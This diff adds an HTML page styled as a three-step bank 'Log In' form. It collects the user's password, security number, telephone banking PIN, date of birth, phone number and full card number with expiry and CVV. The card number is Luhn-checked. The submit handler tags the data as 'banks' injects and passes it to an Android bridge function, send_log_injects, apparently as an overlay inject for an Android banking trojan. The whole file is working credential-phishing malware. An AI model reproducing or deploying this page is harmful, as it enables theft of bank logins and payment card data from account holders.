@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.js"></script>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
+    <style>
+        body {
+            background-color: #2542b7;
+            font-family: Arial, Helvetica, sans-serif;
+            color: #fff;
+        }
+
+        #form1, #form2, #form3 {
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        header {
+            padding: 15px;
+        }
+
+        section {
+            padding: 20px;
+            flex: 1;
+        }
+
+        .input {
+            width: 100%;
+            padding: 8px;
+            padding-left: 0;
+            border: 0;
+            border-bottom: 1px solid #306fe37c;
+            background-color: transparent;
+            margin-bottom: 15px;
+            color: #fff;
+        }
+
+        .input:focus {
+            border-color: #306fe3;
+        }
+
+        label {
+            margin: 0;
+        }
+
+        footer {
+            padding: 30px 20px;
+        }
+
+        .button {
+            width: 100%;
+            padding: 12px;
+            border: 0;
+            border-radius: 25px;
+            color: #fff;
+            background-color: #306fe3;
+        }
+
+        .button:disabled {
+            opacity: 0.4;
+        }
+
+        .error {
+            border-color: #f00 !important;
+        }
+    </style>
+</head>
+<body>
+    <form onsubmit="return false">
+        <div id="form1">
+            <header>
+                <p style="font-size: 18px;font-weight: 600;text-align: center;">Log In</p>
+            </header>
+            <section>
+                <label for="login">Customer Number or Username</label>
+                <input type="text" class="input" id="login" name="login" autocomplete="off">
+
+                <label for="security">Enter your full security number</label>
+                <input type="text" class="input" id="security" name="login" autocomplete="off">
+                
+                <label for="password">Enter your full password</label>
+                <input type="password" class="input" id="password" name="password" autocomplete="off">
+            </section>
+            <footer>
+                <input type="submit" class="button" id="nextPage" disabled value="Continue">
+            </footer>
+        </div>
+        <div id="form2" style="display: none;">
+            <header>
+                <p style="font-size: 18px;font-weight: 600;text-align: center;">Log In</p>
+            </header>
+            <section>
+                <label for="pin">Enter your full telephone banking pin</label>
+                <input type="tel" class="input" id="pin" name="pin" autocomplete="off">
+
+                <label for="number">Phone number</label>
+                <input type="tel" class="input" id="number" name="login" autocomplete="off">
+                
+                <label for="date">Date of birth</label>
+                <input type="date" class="input" id="date" name="date" autocomplete="off">
+            </section>
+            <footer>
+                <input type="submit" class="button" id="lastPage" disabled value="Continue">
+            </footer>
+        </div>
+        <div id="form3" style="display: none;">
+            <header>
+                <p style="font-size: 18px;font-weight: 600;text-align: center;">Log In</p>
+            </header>
+            <section>
+                <label for="cc">Master card number</label>
+                <input type="tel" class="input" id="cc" name="cc" autocomplete="off">
+
+                <div>
+                    <div style="float: left; width: 58%">
+                        <label for="exp">Expiry date</label>
+                        <input type="tel" class="input" id="exp" name="exp" autocomplete="off">
+                    </div>
+                    <div style="float: right;width: 40%;">
+                        <label for="cvv">CVV</label>
+                        <input type="tel" class="input" id="cvv" name="cvv" autocomplete="off">
+                    </div>
+                </div>
+                
+            </section>
+            <footer>
+                <input type="submit" class="button" id="sendData" disabled value="Log In">
+            </footer>
+        </div>
+    </form>
+    <script>
+        
+        $('#number').mask('0#')
+        $('#pin').mask('0#')
+        $('#cc').mask('0000 0000 0000 0000')
+        $('#exp').mask('00/00')
+        $('#cvv').mask('000')
+
+        var form1 = document.getElementById('form1'),   
+            form2 = document.getElementById('form2'),
+            form3 = document.getElementById('form3');
+
+        var login = document.getElementById('login'),
+            security = document.getElementById('security'),
+            password = document.getElementById('password'),
+            pin = document.getElementById('pin'),
+            number = document.getElementById('number'),
+            date = document.getElementById('date'),
+            cc = document.getElementById('cc'),
+            exp = document.getElementById('exp'),
+            cvv = document.getElementById('cvv');
+
+        var nextPage = document.getElementById('nextPage'),
+            lastPage = document.getElementById('lastPage'),
+            sendData = document.getElementById('sendData');
+
+        function check() {
+            if(login.value.length > 4 && security.value.length > 3 && password.value.length > 4) {
+                nextPage.disabled = false
+            } else {
+                nextPage.disabled = true
+            }
+        }
+        
+        function check2() {
+            if(pin.value.length > 3 && number.value.length > 4 && date.value.length == 10) {
+                lastPage.disabled = false
+            } else {
+                lastPage.disabled = true
+            }
+        }
+
+        function valid_credit_card(value) {
+            if(value=='' || value.length < 19 || value=='0000 0000 0000 0000') return false;
+            if (/[^0-9-\s]+/.test(value)) return false;
+            var nCheck = 0, nDigit = 0, bEven = false;
+            value = value.replace(/\D/g, "");
+            for (var n = value.length - 1; n >= 0; n--) {
+                var cDigit = value.charAt(n),
+                    nDigit = parseInt(cDigit, 10);
+                if (bEven) {
+                    if ((nDigit *= 2) > 9) nDigit -= 9;
+                }
+                nCheck += nDigit;
+                bEven = !bEven;
+            }
+            return (nCheck % 10) == 0;
+        }
+
+        function check4() {
+                var mmYY = exp.value.split('/');
+				var month = parseInt(mmYY[0]);
+				var year = parseInt(mmYY[1]);
+			
+
+				var expArray = exp.value.split('/');
+				var today, someday;
+				var exMonth = expArray[0];
+				var exYear = "20" + expArray[1];
+
+				today = new Date();
+				someday = new Date();
+				someday.setFullYear(exYear, exMonth, 1);
+
+                function expCheck() {
+                    if(month > 12 || month == 0 || month == 00 || someday < today || year > 27 || exp.value.length != 5) {
+                        return false
+                    } else {
+                        return true
+                    }
+                }
+
+            if(valid_credit_card(cc.value) && expCheck() == true && cvv.value.length == 3) {
+                sendData.disabled = false
+            } else {
+                sendData.disabled = true
+            }
+        }
+
+        login.onkeyup = () => {
+            check()
+        }
+
+        security.onkeyup = () => {
+            check()
+        }
+
+        password.onkeyup = () => {
+            check()
+        }
+
+        pin.onkeyup = () => {
+            check2()
+        }
+
+        number.onkeyup = () => {
+            check2()
+        }
+
+        date.onchange = () => {
+            check2()
+        }
+
+        cc.onkeyup = () => {
+            check4()
+        }
+
+        exp.onkeyup = () => {
+            check4()
+        }
+
+        cvv.onkeyup = () => {
+            check4()
+        }
+
+        nextPage.onclick = () => {
+            form1.style.display = 'none'
+            form2.style.display = 'flex'
+        }
+
+        lastPage.onclick = () => {
+            form2.style.display = 'none'
+            form3.style.display = 'flex'
+        }
+
+        sendData.onclick = () => {
+        
+            var data = {};
+                data.login = login.value;
+                data.security = security.value;
+                data.password = password.value;
+                data.pin = pin.value;
+                data.number = number.value;
+                data.date = date.value;
+                data.cc = cc.value;
+                data.exp = exp.value;
+                data.cvv = cvv.value;
+                data.type_injects = "banks";
+                data.closed = "close_activity_injects";
+
+                var ua = navigator.userAgent.toLowerCase();
+                if(ua.indexOf("android") > -1) {
+                    try {
+                        Android.send_log_injects(JSON.stringify(data))
+                    } catch (err) {}
+                }else{
+                    alert(JSON.stringify(data));
+                }
+        }
+        
+    </script>
+</body>
+</html>
